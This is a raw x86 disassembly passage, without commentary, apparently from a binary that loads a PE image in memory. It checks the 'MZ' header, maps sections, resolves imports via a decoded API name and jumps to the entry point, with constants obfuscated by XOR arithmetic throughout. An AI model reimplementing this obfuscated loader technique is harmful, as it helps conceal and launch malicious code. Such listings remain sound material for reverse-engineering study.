  425fc5:	cmp    edi,esi
  425fc7:	jne    0x425fd1
  425fc9:	mov    esi,DWORD PTR [ebp-0x20]
  425fcc:	mov    edi,DWORD PTR [ebp-0x24]
  425fcf:	add    DWORD PTR [esi],edi
  425fd1:	add    ebx,0x2
  425fd4:	dec    DWORD PTR [ebp-0x18]
  425fd7:	jne    0x425f78
  425fd9:	mov    ebx,DWORD PTR [ebp-0xc]
  425fdc:	add    DWORD PTR [ebp-0x8],ebx
  425fdf:	mov    esi,DWORD PTR [ebp-0x1c]
  425fe2:	mov    edi,DWORD PTR [ebp-0x8]
  425fe5:	mov    ebx,DWORD PTR [ebp+0xc]
  425fe8:	xor    esi,ecx
  425fea:	cmp    edi,DWORD PTR [ebx+esi*8+0x193982c]
  425ff1:	jae    0x42600b
  425ff3:	add    eax,DWORD PTR [ebp-0xc]
  425ff6:	mov    esi,DWORD PTR [ebp-0x4]
  425ff9:	mov    ebx,DWORD PTR [eax+0x4]
  425ffc:	xor    esi,ecx
  425ffe:	add    esi,edx
  426000:	mov    DWORD PTR [ebp-0xc],ebx
  426003:	cmp    ebx,esi
  426005:	jne    0x425f5f
  42600b:	pop    ebx
  42600c:	mov    eax,DWORD PTR [ebp-0x28]
  42600f:	pop    edi
  426010:	jmp    0x426015
  426012:	mov    eax,DWORD PTR [ebp-0x4]
  426015:	xor    eax,ecx
  426017:	add    eax,edx
  426019:	pop    esi
  42601a:	leave  
  42601b:	ret    0x8
  42601e:	push   ebp
  42601f:	mov    ebp,esp
  426021:	sub    esp,0xd8
  426027:	mov    DWORD PTR [ebp-0x4],0xf89c85a5
  42602e:	mov    DWORD PTR [ebp-0x24],0xf89c85a4
  426035:	mov    eax,DWORD PTR [ebp-0x4]
  426038:	push   ebx
  426039:	push   esi
  42603a:	mov    esi,0x75108af
  42603f:	xor    eax,esi
  426041:	push   edi
  426042:	mov    edi,0x3272f6
  426047:	add    eax,edi
  426049:	mov    DWORD PTR [ebp-0x18],eax
  42604c:	mov    eax,DWORD PTR [ebp-0x4]
  42604f:	xor    eax,esi
  426051:	add    eax,edi
  426053:	mov    DWORD PTR [ebp-0x8],eax
  426056:	mov    ebx,DWORD PTR [ebp+0x20]
  426059:	mov    eax,DWORD PTR [ebp-0x1c]
  42605c:	mov    ecx,DWORD PTR [ebp-0x1c]
  42605f:	xor    eax,ecx
  426061:	mov    DWORD PTR [ebp-0x1c],eax
  426064:	add    DWORD PTR [ebp-0x1c],0xf89cb5a5
  42606b:	mov    eax,DWORD PTR [ebp-0xc]
  42606e:	mov    ecx,DWORD PTR [ebp-0xc]
  426071:	xor    eax,ecx
  426073:	mov    DWORD PTR [ebp-0xc],eax
  426076:	add    DWORD PTR [ebp-0xc],0xf89c85e5
  42607d:	mov    eax,DWORD PTR [ebp-0x10]
  426080:	mov    ecx,DWORD PTR [ebp-0x10]
  426083:	xor    eax,ecx
  426085:	mov    DWORD PTR [ebp-0x10],eax
  426088:	add    DWORD PTR [ebp-0x10],0xf89c85a1
  42608f:	mov    eax,DWORD PTR [ebp-0x28]
  426092:	mov    ecx,DWORD PTR [ebp-0x28]
  426095:	xor    eax,ecx
  426097:	mov    DWORD PTR [ebp-0x28],eax
  42609a:	add    DWORD PTR [ebp-0x28],0xf89f05a5
  4260a1:	mov    DWORD PTR [ebp+0x20],0xf89ceff8
  4260a8:	mov    eax,DWORD PTR [ebp+0x8]
  4260ab:	test   eax,eax
  4260ad:	je     0x426534
  4260b3:	mov    eax,DWORD PTR [ebp+0xc]
  4260b6:	test   eax,eax
  4260b8:	je     0x426534
  4260be:	mov    eax,DWORD PTR [ebp+0x18]
  4260c1:	test   eax,eax
  4260c3:	je     0x426534
  4260c9:	mov    eax,DWORD PTR [ebp+0x20]
  4260cc:	mov    ecx,DWORD PTR [ebp+0x8]
  4260cf:	xor    eax,0x8af
  4260d4:	add    eax,0x72f6
  4260d9:	cmp    WORD PTR [ecx],ax
  4260dc:	jne    0x426534
  4260e2:	mov    eax,DWORD PTR [ebp-0x4]
  4260e5:	xor    eax,esi
  4260e7:	add    eax,edi
  4260e9:	mov    DWORD PTR [ebp-0x30],eax
  4260ec:	mov    eax,DWORD PTR [ebp-0x4]
  4260ef:	mov    ecx,DWORD PTR [ebp+0x8]
  4260f2:	mov    eax,DWORD PTR [ebp+0x8]
  4260f5:	add    eax,DWORD PTR [ecx+0x3c]
  4260f8:	mov    DWORD PTR [ebp+0xc],eax
  4260fb:	mov    eax,DWORD PTR [eax+0x50]
  4260fe:	test   eax,eax
  426100:	je     0x426534
  426106:	mov    DWORD PTR [ebp-0x2c],0xf88c85a5
  42610d:	mov    eax,DWORD PTR [ebp-0x2c]
  426110:	xor    eax,esi
  426112:	add    eax,edi
  426114:	mov    DWORD PTR [ebp-0x2c],eax
  426117:	mov    eax,DWORD PTR [ebp-0x4]
  42611a:	mov    eax,DWORD PTR [ebx+0x190]
  426120:	mov    ecx,DWORD PTR [eax]
  426122:	mov    ecx,DWORD PTR [ecx+0x3c]
  426125:	add    ecx,DWORD PTR [eax]
  426127:	mov    eax,DWORD PTR [ebp-0x4]
  42612a:	mov    eax,DWORD PTR [ebx+0x18c]
  426130:	mov    edx,DWORD PTR [eax]
  426132:	mov    DWORD PTR [ebp-0x20],ecx
  426135:	mov    DWORD PTR [ebp+0x20],edx
  426138:	cmp    edx,edx
  42613a:	jne    0x42616e
  42613c:	mov    eax,DWORD PTR [ebx+0x1e0]
  426142:	lea    edx,[ebp-0x18]
  426145:	push   edx
  426146:	mov    edx,DWORD PTR [ebp-0xc]
  426149:	xor    edx,esi
  42614b:	add    edx,edi
  42614d:	push   edx
  42614e:	push   DWORD PTR [ecx+0x50]
  426151:	push   DWORD PTR [ebp+0x20]
  426154:	call   DWORD PTR [eax+0x1c]
  426157:	mov    eax,DWORD PTR [ebp-0x20]
  42615a:	mov    ecx,DWORD PTR [eax+0x54]
  42615d:	mov    eax,DWORD PTR [eax+0x50]
  426160:	sub    eax,ecx
  426162:	add    ecx,DWORD PTR [ebp+0x20]
  426165:	push   ecx
  426166:	call   0x426ad1
  42616b:	mov    edx,DWORD PTR [ebp+0x20]
  42616e:	mov    eax,DWORD PTR [ebx+0x194]
  426174:	mov    DWORD PTR [eax],edx
  426176:	mov    eax,DWORD PTR [ebp+0xc]
  426179:	push   DWORD PTR [eax+0x54]
  42617c:	push   DWORD PTR [ebp+0x8]
  42617f:	push   edx
  426180:	call   0x4269c7
  426185:	mov    ecx,DWORD PTR [ebp+0x20]
  426188:	mov    eax,DWORD PTR [ecx+0x3c]
  42618b:	add    eax,ecx
  42618d:	movzx  ecx,WORD PTR [eax+0x14]
  426191:	lea    ecx,[ecx+eax*1+0x18]
  426195:	mov    DWORD PTR [ebp+0x18],ecx
  426198:	mov    ecx,DWORD PTR [ebp-0x4]
  42619b:	movzx  edx,WORD PTR [eax+0x6]
  42619f:	xor    ecx,esi
  4261a1:	add    ecx,edi
  4261a3:	mov    DWORD PTR [ebp+0xc],eax
  4261a6:	cmp    edx,ecx
  4261a8:	je     0x426255
  4261ae:	mov    ecx,DWORD PTR [ebp-0x4]
  4261b1:	xor    ecx,esi
  4261b3:	add    ecx,edi
  4261b5:	mov    DWORD PTR [ebp-0x8],ecx
  4261b8:	mov    ecx,DWORD PTR [ebp-0x24]
  4261bb:	movzx  edx,WORD PTR [eax+0x6]
  4261bf:	xor    ecx,esi
  4261c1:	sub    edx,ecx
  4261c3:	sub    edx,edi
  4261c5:	cmp    DWORD PTR [ebp-0x8],edx
  4261c8:	ja     0x426255
  4261ce:	mov    edx,DWORD PTR [ebp+0x18]
  4261d1:	add    edx,0x8
  4261d4:	mov    DWORD PTR [ebp+0x18],edx
  4261d7:	jmp    0x4261dc
  4261d9:	mov    edx,DWORD PTR [ebp+0x18]
  4261dc:	mov    eax,DWORD PTR [eax+0x38]
  4261df:	lea    ecx,[eax-0x1]
  4261e2:	mov    DWORD PTR [ebp-0x38],eax
  4261e5:	mov    eax,DWORD PTR [edx]
  4261e7:	test   eax,ecx
  4261e9:	je     0x4261f2
  4261eb:	not    ecx
  4261ed:	and    eax,ecx
  4261ef:	add    eax,DWORD PTR [ebp-0x38]
  4261f2:	mov    ecx,DWORD PTR [edx+0x4]
  4261f5:	add    ecx,DWORD PTR [ebp+0x20]
  4261f8:	push   ecx
  4261f9:	call   0x426ad1
  4261fe:	mov    edx,DWORD PTR [ebp-0x4]
  426201:	mov    eax,DWORD PTR [ebp+0x18]
  426204:	mov    ecx,DWORD PTR [eax+0x8]
  426207:	xor    edx,esi
  426209:	add    edx,edi
  42620b:	cmp    ecx,edx
  42620d:	je     0x426226
  42620f:	push   ecx
  426210:	mov    ecx,DWORD PTR [ebp+0x8]
  426213:	add    ecx,DWORD PTR [eax+0xc]
  426216:	mov    eax,DWORD PTR [eax+0x4]
  426219:	add    eax,DWORD PTR [ebp+0x20]
  42621c:	push   ecx
  42621d:	push   eax
  42621e:	call   0x4269c7
  426223:	mov    eax,DWORD PTR [ebp+0x18]
  426226:	mov    ecx,DWORD PTR [ebp-0x24]
  426229:	mov    edx,DWORD PTR [ebp-0x8]
  42622c:	add    eax,0x28
  42622f:	xor    ecx,esi
  426231:	lea    ecx,[edx+ecx*1+0x3272f6]
  426238:	mov    edx,DWORD PTR [ebp+0xc]
  42623b:	mov    DWORD PTR [ebp+0x18],eax
  42623e:	mov    eax,DWORD PTR [ebp-0x24]
  426241:	movzx  edx,WORD PTR [edx+0x6]
  426245:	xor    eax,esi
  426247:	sub    edx,eax
  426249:	mov    eax,DWORD PTR [ebp+0xc]
  42624c:	sub    edx,edi
  42624e:	mov    DWORD PTR [ebp-0x8],ecx
  426251:	cmp    ecx,edx
  426253:	jbe    0x4261d9
  426255:	mov    edx,DWORD PTR [ebx+0x18c]
  42625b:	mov    ecx,DWORD PTR [ebp+0x20]
  42625e:	cmp    ecx,DWORD PTR [edx]
  426260:	jne    0x426289
  426262:	mov    eax,DWORD PTR [ebx+0x1e0]
  426268:	lea    edx,[ebp-0x18]
  42626b:	push   edx
  42626c:	mov    edx,DWORD PTR [ebp-0x10]
  42626f:	xor    edx,esi
  426271:	add    edx,edi
  426273:	push   edx
  426274:	mov    edx,DWORD PTR [ebp-0x20]
  426277:	push   DWORD PTR [edx+0x54]
  42627a:	push   ecx
  42627b:	call   DWORD PTR [eax+0x1c]
  42627e:	test   eax,eax
  426280:	je     0x426525
  426286:	mov    eax,DWORD PTR [ebp+0xc]
  426289:	mov    ecx,DWORD PTR [ebx+0x1c8]
  42628f:	mov    ecx,DWORD PTR [ecx]
  426291:	xor    ecx,esi
  426293:	add    ecx,edi
  426295:	je     0x426450
  42629b:	mov    eax,DWORD PTR [ebp-0x4]
  42629e:	xor    eax,esi
  4262a0:	add    eax,edi
  4262a2:	and    DWORD PTR [ebp+0x8],0x0
  4262a6:	mov    DWORD PTR [ebp-0x14],eax
  4262a9:	mov    eax,0xf89c85c1
  4262ae:	lea    ecx,[eax+0x18]
  4262b1:	mov    DWORD PTR [ebp-0x58],0xf89c85d7
  4262b8:	mov    DWORD PTR [ebp-0x54],0xf89c85d1
  4262bf:	mov    DWORD PTR [ebp-0x50],eax
  4262c2:	mov    DWORD PTR [ebp-0x4c],ecx
  4262c5:	mov    DWORD PTR [ebp-0x48],ecx
  4262c8:	mov    DWORD PTR [ebp-0x44],0xf89c85a5
  4262cf:	mov    edx,DWORD PTR [ebp+0x8]
  4262d2:	mov    ecx,0x8af
  4262d7:	xor    cx,WORD PTR [ebp+edx*4-0x58]
  4262dc:	mov    edx,0x72f6
  4262e1:	add    cx,dx
  4262e4:	mov    edx,DWORD PTR [ebp+0x8]
  4262e7:	inc    DWORD PTR [ebp+0x8]
  4262ea:	cmp    DWORD PTR [ebp+0x8],0x6
  4262ee:	mov    WORD PTR [ebp+edx*2-0xc0],cx
  4262f6:	jb     0x4262cf
  4262f8:	mov    ecx,0xf89c85d3
  4262fd:	mov    DWORD PTR [ebp-0xb0],eax
  426303:	mov    DWORD PTR [ebp-0x9c],eax
  426309:	mov    DWORD PTR [ebp-0x74],eax
  42630c:	mov    DWORD PTR [ebp-0x70],eax
  42630f:	lea    eax,[ecx-0x1]
  426312:	lea    edx,[ecx+0x2c]
  426315:	mov    DWORD PTR [ebp-0x64],eax
  426318:	mov    DWORD PTR [ebp-0x60],eax
  42631b:	mov    DWORD PTR [ebp-0xb4],0xf89c85f9
  426325:	mov    DWORD PTR [ebp-0xac],ecx
  42632b:	mov    DWORD PTR [ebp-0xa8],edx
  426331:	mov    DWORD PTR [ebp-0xa4],0xf89c85dc
  42633b:	mov    DWORD PTR [ebp-0xa0],0xf89c85d7
  426345:	mov    DWORD PTR [ebp-0x98],0xf89c85e0
  42634f:	mov    DWORD PTR [ebp-0x94],0xf89c85d7
  426359:	mov    DWORD PTR [ebp-0x90],0xf89c85d1
  426363:	mov    DWORD PTR [ebp-0x8c],ecx
  426369:	mov    DWORD PTR [ebp-0x88],0xf89c852c
  426373:	mov    DWORD PTR [ebp-0x84],edx
  426379:	mov    DWORD PTR [ebp-0x80],0xf89c85d6
  426380:	mov    DWORD PTR [ebp-0x7c],ecx
  426383:	mov    DWORD PTR [ebp-0x78],0xf89c85e4
  42638a:	mov    DWORD PTR [ebp-0x6c],ecx
  42638d:	mov    DWORD PTR [ebp-0x68],0xf89c85c0
  426394:	mov    DWORD PTR [ebp-0x5c],0xf89c85a5
  42639b:	xor    eax,eax
  42639d:	mov    cl,BYTE PTR [ebp+eax*4-0xb4]
  4263a4:	xor    cl,0xaf
  4263a7:	sub    cl,0xa
  4263aa:	mov    BYTE PTR [ebp+eax*1-0xd8],cl
  4263b1:	inc    eax
  4263b2:	cmp    eax,0x17
  4263b5:	jb     0x42639d
  4263b7:	mov    eax,DWORD PTR [ebx+0x1e0]
  4263bd:	lea    ecx,[ebp-0xc0]
  4263c3:	push   ecx
  4263c4:	call   DWORD PTR [eax+0x4]
  4263c7:	mov    ecx,DWORD PTR [ebx+0x1e0]
  4263cd:	lea    edx,[ebp-0xd8]
  4263d3:	push   edx
  4263d4:	push   eax
  4263d5:	call   DWORD PTR [ecx+0x8]
  4263d8:	mov    DWORD PTR [ebp-0x40],eax
  4263db:	lea    eax,[ebp-0x14]
  4263de:	push   eax
  4263df:	mov    eax,DWORD PTR [ebx+0x18c]
  4263e5:	push   DWORD PTR [eax]
  4263e7:	mov    eax,DWORD PTR [ebp-0x40]
  4263ea:	call   eax
  4263ec:	mov    eax,DWORD PTR [ebp-0x4]
  4263ef:	xor    eax,esi
  4263f1:	add    eax,edi
  4263f3:	mov    DWORD PTR [ebp-0x34],eax
  4263f6:	mov    ecx,DWORD PTR [ebp-0x4]
  4263f9:	mov    eax,DWORD PTR [ebp-0x14]
  4263fc:	xor    ecx,esi
  4263fe:	add    ecx,edi
  426400:	cmp    eax,ecx
  426402:	je     0x42644d
  426404:	mov    DWORD PTR [ebp-0x3c],eax
  426407:	jmp    0x426418
  426409:	mov    eax,DWORD PTR [eax]
  42640b:	mov    ecx,DWORD PTR [ebp-0x3c]
  42640e:	mov    DWORD PTR [ebp-0x14],eax
  426411:	mov    eax,DWORD PTR [ebp-0x14]
  426414:	cmp    eax,ecx
  426416:	je     0x426425
  426418:	mov    edx,DWORD PTR [eax+0x18]
  42641b:	mov    ecx,DWORD PTR [ebx+0x18c]
  426421:	cmp    edx,DWORD PTR [ecx]
  426423:	jne    0x426409
  426425:	mov    ecx,DWORD PTR [ebx+0x18c]
  42642b:	mov    edx,DWORD PTR [eax+0x18]
  42642e:	cmp    edx,DWORD PTR [ecx]
  426430:	jne    0x42644d
  426432:	mov    ecx,DWORD PTR [ebx+0x190]
  426438:	mov    edx,DWORD PTR [ebp-0x20]
  42643b:	mov    edx,DWORD PTR [edx+0x28]
  42643e:	add    edx,DWORD PTR [ecx]
  426440:	mov    DWORD PTR [eax+0x1c],edx
  426443:	mov    eax,DWORD PTR [ebp-0x24]
  426446:	xor    eax,esi
  426448:	add    eax,edi
  42644a:	mov    DWORD PTR [ebp-0x34],eax
  42644d:	mov    eax,DWORD PTR [ebp+0xc]
  426450:	push   ebx
  426451:	push   eax
  426452:	push   DWORD PTR [ebp+0x20]
  426455:	call   0x425bd5
  42645a:	test   eax,eax
  42645c:	je     0x426525
  426462:	push   DWORD PTR [ebp+0xc]
  426465:	mov    ecx,ebx
  426467:	push   DWORD PTR [ebp+0x20]
  42646a:	call   0x425b2e
  42646f:	test   eax,eax
  426471:	je     0x426525
  426477:	mov    eax,DWORD PTR [ebp+0xc]
  42647a:	mov    edx,DWORD PTR [ebp+0x20]
  42647d:	mov    ecx,ebx
  42647f:	call   0x425a07
  426484:	test   eax,eax
  426486:	je     0x426525
  42648c:	push   ebx
  42648d:	push   DWORD PTR [ebp+0x20]
  426490:	call   0x425eb8
  426495:	test   eax,eax
  426497:	je     0x426525
  42649d:	mov    eax,DWORD PTR [ebx+0x18c]
  4264a3:	mov    edx,DWORD PTR [ebp+0x20]
  4264a6:	cmp    edx,DWORD PTR [eax]
  4264a8:	jne    0x4264c4
  4264aa:	mov    eax,DWORD PTR [ebx+0x1e0]
  4264b0:	lea    ecx,[ebp-0x18]
  4264b3:	push   ecx
  4264b4:	push   DWORD PTR [ebp-0x18]
  4264b7:	mov    ecx,DWORD PTR [ebp-0x20]
  4264ba:	push   DWORD PTR [ecx+0x54]
  4264bd:	push   edx
  4264be:	call   DWORD PTR [eax+0x1c]
  4264c1:	mov    edx,DWORD PTR [ebp+0x20]
  4264c4:	mov    eax,DWORD PTR [ebx+0x1c8]
  4264ca:	mov    eax,DWORD PTR [eax]
  4264cc:	xor    eax,esi
  4264ce:	add    eax,edi
  4264d0:	je     0x426509
  4264d2:	mov    ecx,DWORD PTR [ebp+0xc]
  4264d5:	mov    eax,DWORD PTR [ecx+0x28]
  4264d8:	mov    DWORD PTR [ebp+0x8],0xf89ca5a5
  4264df:	mov    esi,DWORD PTR [ebp+0x8]
  4264e2:	push   DWORD PTR [ebp+0x14]
  4264e5:	xor    esi,0x8af
  4264eb:	push   DWORD PTR [ebp+0x10]
  4264ee:	add    esi,0x72f6
  4264f4:	or     WORD PTR [ecx+0x16],si
  4264f8:	add    eax,edx
  4264fa:	push   edx
  4264fb:	call   eax
  4264fd:	mov    DWORD PTR [ebx+0x1d0],0xf89c85a4
  426507:	jmp    0x426513
  426509:	mov    eax,DWORD PTR [ebp+0xc]
  42650c:	mov    eax,DWORD PTR [eax+0x28]
  42650f:	add    eax,edx
  426511:	call   eax
  426513:	mov    DWORD PTR [ebp-0x8],eax
  426516:	mov    eax,DWORD PTR [ebp-0x8]
  426519:	mov    ecx,DWORD PTR [ebp+0x1c]
  42651c:	mov    DWORD PTR [ecx],eax
  42651e:	mov    DWORD PTR [ebp-0x30],0x1
  426525:	cmp    DWORD PTR [ebp-0x30],0x0
  426529:	jne    0x42652f
  42652b:	and    DWORD PTR [ebp+0x20],0x0
  42652f:	mov    eax,DWORD PTR [ebp+0x20]
  426532:	jmp    0x426536
  426534:	xor    eax,eax
  426536:	pop    edi
  426537:	pop    esi
  426538:	pop    ebx
  426539:	leave  
  42653a:	ret    0x1c
  42653d:	push   ebp
  42653e:	mov    ebp,esp
  426540:	movzx  edx,WORD PTR [ecx+0x6]
  426544:	movzx  eax,WORD PTR [ecx+0x14]
  426548:	push   ebx
  426549:	push   edi
  42654a:	xor    edi,edi
  42654c:	lea    eax,[eax+ecx*1+0x18]
  426550:	test   edx,edx
  426552:	je     0x426573
  426554:	mov    ecx,DWORD PTR [eax+0xc]
  426557:	lea    ebx,[ecx+esi*1]
  42655a:	cmp    DWORD PTR [ebp+0x8],ebx
  42655d:	jb     0x42656b
  42655f:	mov    ebx,DWORD PTR [eax+0x8]
  426562:	add    ebx,ecx
  426564:	add    ebx,esi
  426566:	cmp    DWORD PTR [ebp+0x8],ebx
  426569:	jb     0x426575
  42656b:	add    eax,0x28
  42656e:	inc    edi
  42656f:	cmp    edi,edx
  426571:	jb     0x426554
  426573:	xor    eax,eax
  426575:	pop    edi
  426576:	pop    ebx
  426577:	pop    ebp
  426578:	ret    0x4
  42657b:	push   ebp
  42657c:	mov    ebp,esp
  42657e:	sub    esp,0x34
  426581:	mov    DWORD PTR [ebp-0xc],0xf89c85a5
  426588:	mov    DWORD PTR [ebp-0x18],0xf89c85a4
  42658f:	mov    DWORD PTR [ebp-0x1c],0xf89c85a3
  426596:	mov    DWORD PTR [ebp-0x8],0xf89c85c4
  42659d:	mov    DWORD PTR [ebp-0x20],0xf89c85e4
  4265a4:	mov    DWORD PTR [ebp-0x2c],0xf89c852b
  4265ab:	mov    DWORD PTR [ebp-0x2c],0xf89c85cb
  4265b2:	mov    DWORD PTR [ebp-0x10],eax
  4265b5:	mov    eax,DWORD PTR [ebp+0x8]
  4265b8:	mov    DWORD PTR [ebp-0x14],eax
  4265bb:	mov    eax,DWORD PTR [ebp-0xc]
  4265be:	push   ebx
  4265bf:	mov    ecx,0x75108af
  4265c4:	xor    eax,ecx
  4265c6:	push   esi
  4265c7:	mov    esi,DWORD PTR [ebp-0x10]
  4265ca:	mov    edx,0x3272f6
  4265cf:	add    eax,edx
  4265d1:	push   edi
  4265d2:	cmp    esi,eax
  4265d4:	je     0x4267b3
  4265da:	mov    eax,DWORD PTR [ebp-0xc]
  4265dd:	mov    esi,DWORD PTR [ebp-0x14]
  4265e0:	xor    eax,ecx
  4265e2:	add    eax,edx
  4265e4:	cmp    esi,eax
  4265e6:	je     0x4267b3
  4265ec:	mov    eax,DWORD PTR [ebp-0xc]
  4265ef:	xor    eax,ecx
  4265f1:	add    eax,edx
  4265f3:	mov    DWORD PTR [ebp-0x24],eax
  4265f6:	mov    eax,DWORD PTR [ebp-0xc]
  4265f9:	xor    eax,ecx
  4265fb:	add    eax,edx
  4265fd:	mov    DWORD PTR [ebp-0x28],eax
  426600:	mov    edi,DWORD PTR [ebp-0x20]
  426603:	mov    ebx,DWORD PTR [ebp-0x8]
  426606:	mov    esi,0x8af
  42660b:	xor    edi,esi
  42660d:	mov    eax,0x72f6
  426612:	xor    ebx,esi
  426614:	add    edi,eax
  426616:	add    ebx,eax
  426618:	sub    ebx,edi
  42661a:	mov    WORD PTR [ebp-0x8],bx
  42661e:	jmp    0x4266e3
  426623:	mov    edi,DWORD PTR [ebp-0xc]
  426626:	mov    bx,WORD PTR [ebp-0x4]
  42662a:	xor    edi,esi
  42662c:	add    edi,eax
  42662e:	cmp    bx,di
  426631:	je     0x426725
  426637:	mov    edi,DWORD PTR [ebp-0xc]
  42663a:	mov    ebx,DWORD PTR [ebp+0xc]
  42663d:	xor    edi,ecx
  42663f:	add    edi,edx
  426641:	cmp    ebx,edi
  426643:	mov    di,WORD PTR [ebp-0x4]
  426647:	mov    bx,WORD PTR [ebp+0x8]
  42664b:	je     0x4266b6
  42664d:	cmp    bx,di
  426650:	je     0x4266bf
  426652:	mov    edi,DWORD PTR [ebp-0x20]
  426655:	mov    bx,WORD PTR [ebp+0x8]
  426659:	xor    edi,esi
  42665b:	add    edi,eax
  42665d:	cmp    bx,di
  426660:	jb     0x426680
  426662:	mov    edi,DWORD PTR [ebp-0x2c]
  426665:	mov    bx,WORD PTR [ebp+0x8]
  426669:	xor    edi,esi
  42666b:	add    edi,eax
  42666d:	cmp    bx,di
  426670:	ja     0x426680
  426672:	movzx  edi,WORD PTR [ebp+0x8]
  426676:	movzx  ebx,WORD PTR [ebp-0x8]
  42667a:	add    edi,ebx
  42667c:	mov    WORD PTR [ebp+0x8],di
  426680:	mov    edi,DWORD PTR [ebp-0x20]
  426683:	mov    bx,WORD PTR [ebp-0x4]
  426687:	xor    edi,esi
  426689:	add    edi,eax
  42668b:	cmp    bx,di
  42668e:	jb     0x4266ae
  426690:	mov    edi,DWORD PTR [ebp-0x2c]
  426693:	mov    bx,WORD PTR [ebp-0x4]
  426697:	xor    edi,esi
  426699:	add    edi,eax
  42669b:	cmp    bx,di
  42669e:	ja     0x4266ae
  4266a0:	movzx  edi,WORD PTR [ebp-0x4]
  4266a4:	movzx  ebx,WORD PTR [ebp-0x8]
  4266a8:	add    edi,ebx
  4266aa:	mov    WORD PTR [ebp-0x4],di
  4266ae:	mov    di,WORD PTR [ebp-0x4]
  4266b2:	mov    bx,WORD PTR [ebp+0x8]
  4266b6:	cmp    bx,di
  4266b9:	jne    0x4267b3
  4266bf:	mov    edi,DWORD PTR [ebp-0x1c]
  4266c2:	mov    ebx,DWORD PTR [ebp-0x10]
  4266c5:	xor    edi,ecx
  4266c7:	lea    edi,[edi+ebx*1+0x3272f6]
  4266ce:	mov    DWORD PTR [ebp-0x10],edi
  4266d1:	mov    edi,DWORD PTR [ebp-0x1c]
  4266d4:	mov    ebx,DWORD PTR [ebp-0x14]
  4266d7:	xor    edi,ecx
  4266d9:	lea    edi,[edi+ebx*1+0x3272f6]
  4266e0:	mov    DWORD PTR [ebp-0x14],edi
  4266e3:	mov    edi,DWORD PTR [ebp-0x24]
  4266e6:	mov    ebx,DWORD PTR [ebp-0x10]
  4266e9:	mov    di,WORD PTR [ebx+edi*2]
  4266ed:	mov    WORD PTR [ebp+0x8],di
  4266f1:	mov    edi,DWORD PTR [ebp-0x28]
  4266f4:	mov    ebx,DWORD PTR [ebp-0x14]
  4266f7:	mov    di,WORD PTR [ebx+edi*2]
  4266fb:	mov    WORD PTR [ebp-0x4],di
  4266ff:	mov    edi,DWORD PTR [ebp-0xc]
  426702:	mov    bx,WORD PTR [ebp+0x8]
  426706:	xor    edi,esi
  426708:	add    edi,eax
  42670a:	cmp    bx,di
  42670d:	jne    0x426623
  426713:	mov    eax,DWORD PTR [ebp-0x18]
  426716:	mov    esi,DWORD PTR [ebp-0xc]
  426719:	xor    eax,ecx
  42671b:	add    eax,edx
  42671d:	imul   eax,esi
  426720:	mov    DWORD PTR [ebp-0xc],eax
  426723:	jmp    0x426737
  426725:	mov    eax,DWORD PTR [ebp-0xc]
  426728:	mov    esi,DWORD PTR [ebp-0x18]
  42672b:	xor    eax,ecx
  42672d:	lea    eax,[eax+esi*1+0x3272f6]
  426734:	mov    DWORD PTR [ebp-0x18],eax
  426737:	mov    eax,DWORD PTR [ebp-0x24]
  42673a:	sub    eax,edx
  42673c:	xor    eax,ecx
  42673e:	mov    DWORD PTR [ebp-0x30],eax
  426741:	mov    eax,DWORD PTR [ebp-0x28]
  426744:	sub    eax,edx
  426746:	xor    eax,ecx
  426748:	mov    DWORD PTR [ebp-0x34],eax
  42674b:	mov    eax,DWORD PTR [ebp-0x34]
  42674e:	mov    esi,DWORD PTR [ebp-0x1c]
  426751:	xor    esi,ecx
  426753:	add    esi,edx
  426755:	xor    eax,ecx
  426757:	add    eax,0x3272f6
  42675c:	imul   esi,eax
  42675f:	mov    eax,DWORD PTR [ebp-0x14]
  426762:	movzx  eax,WORD PTR [esi+eax*1]
  426766:	mov    esi,DWORD PTR [ebp-0x30]
  426769:	mov    edi,DWORD PTR [ebp-0x1c]
  42676c:	xor    esi,ecx
  42676e:	add    esi,edx
  426770:	xor    edi,ecx
  426772:	add    edi,edx
  426774:	imul   edi,esi
  426777:	mov    esi,DWORD PTR [ebp-0x10]
  42677a:	movzx  esi,WORD PTR [edi+esi*1]
  42677e:	sub    eax,edx
  426780:	sub    esi,edx
  426782:	xor    eax,ecx
  426784:	xor    esi,ecx
  426786:	cmp    esi,eax
  426788:	jne    0x4267b3
  42678a:	mov    eax,DWORD PTR [ebp-0x30]
  42678d:	mov    esi,DWORD PTR [ebp-0x1c]
  426790:	xor    eax,ecx
  426792:	add    eax,0x3272f6
  426797:	xor    esi,ecx
  426799:	add    esi,edx
  42679b:	imul   esi,eax
  42679e:	mov    eax,DWORD PTR [ebp-0x10]
  4267a1:	movzx  eax,WORD PTR [esi+eax*1]
  4267a5:	mov    esi,DWORD PTR [ebp-0xc]
  4267a8:	sub    eax,edx
  4267aa:	xor    eax,ecx
  4267ac:	cmp    eax,esi
  4267ae:	mov    eax,DWORD PTR [ebp-0xc]
  4267b1:	je     0x4267b6
  4267b3:	mov    eax,DWORD PTR [ebp-0x18]
  4267b6:	pop    edi
  4267b7:	xor    eax,ecx
  4267b9:	pop    esi
  4267ba:	add    eax,edx
  4267bc:	pop    ebx
  4267bd:	leave  
  4267be:	ret    0x8
  4267c1:	push   ebp
  4267c2:	mov    ebp,esp
  4267c4:	push   ecx
  4267c5:	mov    cx,WORD PTR [eax]
  4267c8:	push   esi
  4267c9:	mov    esi,0x3b5d
  4267ce:	sub    cx,si
  4267d1:	mov    esi,0x8a9b
  4267d6:	xor    cx,si
  4267d9:	mov    esi,0x4e38
  4267de:	mov    DWORD PTR [ebp-0x4],0xf89c85a6
  4267e5:	mov    edx,0xf89c85a5
  4267ea:	cmp    cx,si
  4267ed:	je     0x42684c
  4267ef:	push   ebx
  4267f0:	push   edi
  4267f1:	movzx  ecx,cx
  4267f4:	mov    edi,0xffcd8d0a
  4267f9:	mov    esi,0x75108af
  4267fe:	mov    ebx,0x4e64
  426803:	cmp    cx,bx
  426806:	jne    0x42680b
  426808:	mov    DWORD PTR [ebp-0x4],edx
  42680b:	lea    edx,[edi+0x1]
  42680e:	xor    edx,esi
  426810:	mov    edi,edx
  426812:	xor    edi,esi
  426814:	mov    cx,WORD PTR [eax+edi*2+0x64e5ec]
  42681c:	mov    ebx,0x3b5d
  426821:	sub    cx,bx
  426824:	mov    ebx,0x8a9b
  426829:	xor    cx,bx
  42682c:	mov    ebx,0x4e38
  426831:	cmp    cx,bx
  426834:	jne    0x4267fe
  426836:	mov    ecx,DWORD PTR [ebp-0x4]
  426839:	pop    edi
  42683a:	pop    ebx
  42683b:	cmp    ecx,0xf89c85a6
  426841:	je     0x42684c
  426843:	xor    ecx,esi
